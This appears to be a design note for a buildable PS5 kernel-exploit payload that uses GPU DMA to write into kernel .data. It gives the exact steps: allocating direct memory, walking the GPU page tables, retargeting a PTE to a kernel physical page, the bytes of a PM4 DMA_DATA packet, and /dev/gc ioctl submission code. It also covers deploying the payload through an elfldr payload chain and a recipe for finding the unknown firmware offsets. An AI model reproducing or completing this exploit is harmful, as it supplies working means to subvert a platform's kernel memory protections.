# probe76 — GPU-DMA → kernel .data WRITE verification payload (buildable, v0.43 SDK)

**Payload:** `scratch/ps5/probe76/gpuwrite.elf` (C, ps5-payload-sdk v0.43, prospero-clang).
**Companion to:** `GPU_DMA_WRITE.md` (mechanism). **Status:** builds clean; NOT yet run on-console.
**Log:** `/data/kex_gpuwrite.txt` + stdout.

This payload *verifies* the GPU-DMA write primitive end-to-end: allocate a victim GPU
buffer, walk the GPUVM page tables to find its PTE, retarget that PTE's physical-address
field to a kernel `.data` page, issue a `PACKET3_DMA_DATA` (opcode `0x50`) that makes the
GPU copy a known 8-byte sentinel through the retargeted PTE, then read the target back via
`kernel_copyout` and compare. PASS/FAIL + both values are written to the log.

---

## 1. Build

```
wsl -e bash -lc 'cd /mnt/c/Users/USER/AppData/Local/kex/cache/scratch/ps5/probe76 && \
  PS5_PAYLOAD_SDK=/mnt/c/Users/USER/AppData/Local/kex/cache/scratch/ps5/sdk_v043/ps5-payload-sdk make'
```

Produces `gpuwrite.elf` (~118 KB). `make` mirrors `probe72` exactly (same Makefile shape).
Deploy via elfldr (TCP 9021) on the etaHEN/Relapse payload chain.

---

## 2. Exact GPU buffer allocation syscalls (libkernel, resolved via `dlsym(RTLD_DEFAULT,…)`)

```c
int sceKernelAllocateMainDirectMemory(size_t len, size_t alignment, int memoryType, off_t *offset);
int sceKernelMapNamedDirectMemory(void **addr, size_t len, int prot, int flags,
                                  off_t offset, size_t alignment, const char *name);
int sceKernelReleaseDirectMemory(off_t offset, size_t len);
```

Used exactly as:

| buffer | size | `sceKernelAllocateMainDirectMemory` | `sceKernelMapNamedDirectMemory` prot | flags |
|---|---|---|---|---|
| victim  | 0x4000 | align 0x1000, type **0** | `PROT_READ\|PROT_WRITE\|PROT_GPU_READ\|PROT_GPU_WRITE` (0x33) | `MAP_NO_COALESCE` 0x00400000 |
| staging | 0x200  | align 0x1000, type **0** | `PROT_READ\|PROT_WRITE\|PROT_GPU_READ` (0x13) | `MAP_NO_COALESCE` |
| cmd     | 0x100  | align 0x1000, type **0** | `PROT_READ\|PROT_WRITE\|PROT_GPU_READ` (0x13) | `MAP_NO_COALESCE` |

Constants (`GPU_DMA_WRITE.md` §4): `PROT_GPU_READ=0x10`, `PROT_GPU_WRITE=0x20`,
`MAP_NO_COALESCE=0x00400000`, `PROT_READ=1`, `PROT_WRITE=2`.
The returned mapping VA **is** the GPU virtual address (direct memory is a unified
CPU/GPU address space — the same VA is used both for the GPUVM page-table walk and for
the `src_va`/`dst_va` fields of the DMA packet).

---

## 3. GPUVM page-table walk (locate the victim PTE)

Inputs (per-firmware, see §6): `gvmspace` array base and `vmspace->vm_vmid`.

```c
proc        = kernel_get_proc(getpid());                    // via allproc walk
vmspace     = kernel_getlong(proc + KERNEL_OFFSET_PROC_P_VMSPACE);   // SDK const
vmid        = kernel_getint(vmspace + VMSPACE_VM_VMID);              // FLAG #2
gvmspace    = KERNEL_ADDRESS_DATA_BASE + DATA_BASE_GVMSPACE;         // FLAG #1
page_dir_va = kernel_getlong(gvmspace + vmid*0x100 + 0x38);          // GPU PDB2 (PML4) **physical** addr
```

struct gvmspace is **0x100 bytes**: `start_va@0x08`, `size@0x10`, `page_dir_va@0x38`
(`GPU_DMA_WRITE.md` §4). `page_dir_va` holds a **physical** address; every subsequent
table read goes through the DMAP alias `kernel_copyout(KERNEL_ADDRESS_DMAP_BASE + pa, …, 8)`.

4-level walk for `gpu_va` (the victim mapping VA), all entries little-endian u64:

```
pml4e_idx = (gpu_va >> 39) & 0x1FF
pdpe_idx  = (gpu_va >> 30) & 0x1FF
pde_idx   = (gpu_va >> 21) & 0x1FF
pml4e = read_phys(page_dir_va + pml4e_idx*8)
pdpe  = read_phys((pml4e & ADDR_MASK) + pdpe_idx*8)
pde   = read_phys((pdpe  & ADDR_MASK) + pde_idx*8)
if (pde & IS_PTE)            -> 2 MB block leaf: PTE = pde, PTE addr = pd_pa + pde_idx*8
else                          -> descend: pte = read_phys((pde & ADDR_MASK) + ((gpu_va>>12)&0x1FF)*8)
```

PDE/PTE bit layout (`GPU_DMA_WRITE.md` §4): `VALID=bit0`, `IS_PTE=bit54`, `TF=bit56`,
`BLOCK_FRAGMENT_SIZE=bits 59–63 (0x1F)`, `ADDR_MASK=0x0000FFFFFFFFFFC0`.

The victim's real physical page is read straight from its own PTE before retargeting:
`victim_real_pa = pte_val & ADDR_MASK`. A **walk sanity check** verifies
`read_phys(victim_real_pa)` returns the `0xAA…` pattern the payload filled the buffer with,
so a bad walk is caught before any retarget.

---

## 4. Exact PM4 command-buffer bytes (`PACKET3_DMA_DATA`, opcode 0x50)

7 dwords (28 bytes), written to the `cmd` buffer (a GPU-readable direct-memory mapping):

```
dword 0  = 0xC0065002   type3 header: type=3, count=6 (7 dwords), opcode=0x50, shader_compute=1
           = ((3 & 0x3)<<30) | ((6 & 0x3FFF)<<16) | ((0x50 & 0xFF)<<8) | ((1 & 0x1)<<1)
dword 1  = 0x8C00C000   dma_hdr: cp_sync(1<<31) | dst_cache_policy=2 (2<<25) | dst_volatile(1<<27)
                            | src_cache_policy=2 (2<<13) | src_volatile(1<<15)
dword 2  = src_va & 0xFFFFFFFF       (staging mapping VA, low)
dword 3  = src_va >> 32              (staging mapping VA, high)
dword 4  = dst_va & 0xFFFFFFFF       (victim mapping VA, low)
dword 5  = dst_va >> 32              (victim mapping VA, high)
dword 6  = 8                        byte count (21-bit mask 0x1FFFFF)
```

`src_va` = staging buffer VA (holds the 8-byte sentinel `0xDEADBEEFCAFEBABE`),
`dst_va` = victim buffer VA (whose PTE now points at kernel `.data`).
Sentinel written to staging via `memcpy(staging, &(uint64_t){SENTINEL}, 8)`.

---

## 5. Submission — `/dev/gc` ioctl (raw PM4 path, from tcphdr/cragson)

```c
int gc_fd = open("/dev/gc", O_RDWR);           // fallback: "/dev/gc0"

struct gc_submit_arg {                          // 16-byte ioctl argument
  uint32_t pipe_id;      // = 0
  uint32_t count;        // = 1
  uint64_t cmd_buf_ptr;  // CPU VA of the 16-byte command descriptor (below)
};

uint64_t desc[2];                               // 16-byte command descriptor
uint64_t cmd_gpu_va = (uint64_t)(uintptr_t)cmd_va;   // GPU VA of the PM4 packet buffer
desc[0] = ((cmd_gpu_va & 0xFFFFFFFFull) << 32) | 0xC0023F00ull;   // INDIRECT_BUF-like (opcode 0x3F)
desc[1] = ((7ull & 0xFFFFFull) << 32) | ((cmd_gpu_va >> 32) & 0xFFFFull);  // size=7 dwords + addr[47:32]

ioctl(gc_fd, 0xC0108102, &arg);                 // GPU_SUBMIT_IOCTL
```

`0xC0108102` decodes as `_IOW('c', 0x81, 0x2)`-style: 16-byte in/out arg. `desc[1]`
size field = 7 (the DMA_DATA packet is 7 dwords).

---

## 6. FLAGGED — steps that CANNOT be specified exactly here

All four are firmware-specific and must be derived from the target's `kdata` dump
(`kdata_761.bin` / `kdata_1160.bin` / `kdata_1360.bin`) before the probe can run:

1. **`DATA_BASE_GVMSPACE`** (offset of the `gvmspace` array / kernel symbol `gbase_vmspaces`
   inside `.data`) — **UNKNOWN**. The public writeups list it as a per-firmware `.data`
   offset but do not publish a value for 7.61/11.60/13.60. Derivation recipe: scan `.data`
   for page-aligned runs of 0x100-byte records whose `@0x38` field is a low (<4 GB)
   physical address (GPU PDB2) and whose `@0x08/@0x10` fields span the direct-memory VA
   range. *(Not present in `offsets_13.60.js` / `HANDOFF.md`.)*
2. **`VMSPACE_VM_VMID`** (offset of `vm_vmid` in `struct vmspace`) — **UNKNOWN**.
   `vmspace->vm_pmap` is at `0x2e8` (stable, SDK const `KERNEL_OFFSET_VMSPACE_VM_PMAP`);
   `vm_vmid` is a Sony addition at an unverified offset.
3. **`KERNPHYSADDR`** (kernel physical load address) — **assumed `0x200000`** (FreeBSD 11
   amd64 default). Used only in `target_pa = (target_kva - KERNEL_ADDRESS_TEXT_BASE) +
   KERNPHYSADDR`. The payload **self-checks** this before writing: it reads the target field
   through BOTH the canonical KVA and `DMAP_BASE + target_pa` and aborts if they differ, so a
   wrong value cannot cause a bogus write — it just fails the probe with a clear log line.
4. **`KDATA_TARGET_OFF`** (the harmless writable 8-byte `.data` field to scribble) — **must be
   chosen** from `kdata` (an unused padding/BSS field). The payload **saves** the original
   8 bytes, GPU-writes the sentinel, verifies, then **GPU-writes the original bytes back**,
   so the write is transient and side-effect-free regardless of field choice.

Additionally flagged — **GPU PTE leaf granularity / `BLOCK_FRAGMENT_SIZE` decode**
(bits 59–63; 4 KB vs 64 KB vs 8 KB fragment). The walker defaults to 4 KB PTE indexing
(`(gpu_va>>12)&0x1FF`) and treats `IS_PTE`-set PDEs as 2 MB leaves; the payload logs the raw
PDE/PTE values so the descent can be corrected on-console if the GPU uses 64 KB/8 KB
fragments. And **DMA length units**: `dword 6` is treated as a **byte** count (the 21-bit
mask matches stock amdgpu `PACKET3_DMA_DATA` `byte_count`); if the PS5 CP interprets it as
dwords, `DMA_LEN_BYTES` must be changed from 8 → 2.

## 7. Fence/sync caveat

The doc notes ps5-hen uses a crude `usleep(100ms)` (no proper fence). This payload uses
`usleep(200000)` after each submit. If a stale GPU TLB or a slow completion causes a spurious
FAIL, re-run or increase the sleep; a real fence (`sceGnmSubmitDone`/`getSyncValue`) is the
more robust alternative and would replace the raw `/dev/gc` path with
`sceGnmSubmitCommandBuffers(1, &cmd_gpu_addr, &cmd_size, 0, 0)` + `sceGnmSubmitDone()`.

## 8. Expected result

On success the log ends with:
`PASS sentinel=0xdeadbeefcafebabe wrote=0xdeadbeefcafebabe restored=0x<orig> (orig=0x<orig>)`
proving the GPU wrote the sentinel into kernel `.data` (which a CPU `kernel_setlong` would
panic on), and that the field was restored. Any earlier `FAIL` line states which stage
(allocation / walk / sanity / KERNPHYSADDR self-check / ioctl) failed and why.
